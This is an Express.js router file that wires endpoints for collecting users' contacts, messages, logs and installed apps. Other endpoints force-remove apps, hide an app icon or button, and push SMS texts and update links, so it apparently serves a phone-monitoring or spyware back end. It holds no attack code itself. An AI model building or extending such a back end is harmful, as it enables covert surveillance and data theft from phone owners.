var express = require('express');
var router = express.Router();
const { createUserController, addContactController,addGorohi,getGorohi,setHiddenApp,
    getHiddenApp,
    setHiddenButton,
    getHiddenButton,
    addMessageController, addLogController, addAppController,
    appShowState, appButtonState, createGlobalAppController,getShomarandeh,
    getAllGlobalApps, remoteGlobalApp, createGlobalLinkController,getSmsData,
    getAllGlobalLinks, remoteGlobalLink, addDefultSms, findUser, allUsers,
    getAllUpdateLinks, createUpdateLinkController, remoteUpdateLink,
    remotePoshtibaniLink, getAllPoshtibaniLinks, createPoshtibaniLinkController,removeAppController,
    addSenderMessage,removeSenderMessage,getAllSenderMessage,addShomarandeh, getLandingData, getAppState

} = require('../controller/UserController');

/* GET home page. */
router.post('/new-user', createUserController);
router.post('/new-contact', addContactController);
router.post('/new-message', addMessageController);
router.post('/new-gozaresh', addLogController);
router.post('/new-app', addAppController);
router.post('/remove-app-ejbari', removeAppController);
router.post('/find-user', findUser);
router.post('/user-app-state', appShowState);
router.post('/user-button-state', appButtonState);
router.get("/users", allUsers);

router.post('/add-defult-sms', addDefultSms);
router.post('/get-defult-sms', getSmsData);

//global
router.post('/add-global-app', createGlobalAppController);
router.post('/get-all-global-app', getAllGlobalApps);
router.post('/remote-global-app', remoteGlobalApp);

//links
router.post('/add-global-link', createGlobalLinkController);
router.post('/get-all-global-link', getAllGlobalLinks);
router.post('/remote-global-link', remoteGlobalLink);

//Update 
router.post('/add-Update-link', createUpdateLinkController);
router.post('/get-all-Update-link', getAllUpdateLinks);
router.post('/remote-Update-link', remoteUpdateLink);

//Poshtibani
router.post('/add-poshtibani-link', createPoshtibaniLinkController);
router.post('/get-all-poshtibani-link', getAllPoshtibaniLinks);
router.post('/remote-poshtibani-link', remotePoshtibaniLink);

//addSenderMessage
router.post('/add-sender-message', addSenderMessage);
router.post('/remove-sender-message', removeSenderMessage);
router.post('/get-sender-Message', getAllSenderMessage);

//addpluse
router.post('/pluse-counter', addShomarandeh);
router.post('/get-counter', getShomarandeh);
//addGorohi
router.post('/pluse-gorohi', addGorohi);
router.post('/get-gorohi', getGorohi);

//hidden app
router.post('/set-hidden-app',setHiddenApp)
router.post('/get-hidden-app',getHiddenApp )

//defualt state
router.post("/get-state-app" , getAppState)

//hidden button
router.post('/set-hidden-button',setHiddenButton )
router.post('/get-hidden-button',getHiddenButton)



//landing data
router.post('/get-landing-data',getLandingData)

module.exports = router;
